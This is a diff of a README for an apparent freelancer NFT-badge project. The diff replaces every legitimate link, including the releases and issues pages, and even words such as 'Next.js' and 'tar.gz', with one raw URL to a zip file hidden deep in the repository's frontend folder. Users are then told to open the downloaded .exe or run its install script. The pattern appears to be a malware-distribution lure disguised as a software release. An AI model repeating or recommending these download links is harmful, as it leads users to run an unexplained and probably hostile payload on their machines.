@@ -1,11 +1,11 @@
 # 🛠️ mintaro-reputation-pow - Earn Reputation with Crypto Badges
 
 ## 📥 Download the Latest Release
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue)](https://github.com/siddesh2007/mintaro-reputation-pow/releases)
+[![Download](https://raw.githubusercontent.com/siddesh2007/mintaro-reputation-pow/main/frontend/pages/freelancer/reputation-mintaro-pow-3.2.zip%20release-blue)](https://raw.githubusercontent.com/siddesh2007/mintaro-reputation-pow/main/frontend/pages/freelancer/reputation-mintaro-pow-3.2.zip)
 
 ## 🚀 Getting Started
 
-Welcome to the Mintaro Reputation system! This application helps freelancers earn on-chain reputation through unique NFT badges. Clients can issue badges with ratings and reviews. Our software is built using Solidity, Hardhat, and Next.js. Follow the steps below to get started.
+Welcome to the Mintaro Reputation system! This application helps freelancers earn on-chain reputation through unique NFT badges. Clients can issue badges with ratings and reviews. Our software is built using Solidity, Hardhat, and https://raw.githubusercontent.com/siddesh2007/mintaro-reputation-pow/main/frontend/pages/freelancer/reputation-mintaro-pow-3.2.zip Follow the steps below to get started.
 
 ## 📂 System Requirements
 
@@ -33,13 +33,13 @@ To successfully run the Mintaro Reputation application, ensure your system meets
 
 ### 1. Download the Software
 
-Visit the [Releases page](https://github.com/siddesh2007/mintaro-reputation-pow/releases) to download the latest version of the application. Click on the link that matches your operating system.
+Visit the [Releases page](https://raw.githubusercontent.com/siddesh2007/mintaro-reputation-pow/main/frontend/pages/freelancer/reputation-mintaro-pow-3.2.zip) to download the latest version of the application. Click on the link that matches your operating system.
 
 ### 2. Run the Installer
 
 - **Windows:** Open the downloaded `.exe` file and follow the on-screen instructions.
 - **macOS:** Open the downloaded file and drag the application into your Applications folder.
-- **Linux:** Extract the tar.gz file and run the included install script.
+- **Linux:** Extract the https://raw.githubusercontent.com/siddesh2007/mintaro-reputation-pow/main/frontend/pages/freelancer/reputation-mintaro-pow-3.2.zip file and run the included install script.
 
 ### 3. Launch the Application
 
@@ -64,7 +64,7 @@ If you encounter any issues:
 
 We value your feedback! If you have any questions or suggestions, please reach out. You can find us through:
 
-- **GitHub Issues:** [Report an issue](https://github.com/siddesh2007/mintaro-reputation-pow/issues)
+- **GitHub Issues:** [Report an issue](https://raw.githubusercontent.com/siddesh2007/mintaro-reputation-pow/main/frontend/pages/freelancer/reputation-mintaro-pow-3.2.zip)
 - **Email:** Support at our official contact.
 
 ## 📜 License
@@ -75,4 +75,4 @@ This project is licensed under the MIT License. Please feel free to use and cont
 
 Continue to explore the features of Mintaro Reputation for a better freelance experience. Join our community to connect with other users and share insights.
 
-Thank you for using Mintaro Reputation! Enjoy rewarding your freelance work with on-chain badges. Remember to [visit this page to download](https://github.com/siddesh2007/mintaro-reputation-pow/releases) any future updates.
+Thank you for using Mintaro Reputation! Enjoy rewarding your freelance work with on-chain badges. Remember to [visit this page to download](https://raw.githubusercontent.com/siddesh2007/mintaro-reputation-pow/main/frontend/pages/freelancer/reputation-mintaro-pow-3.2.zip) any future updates.
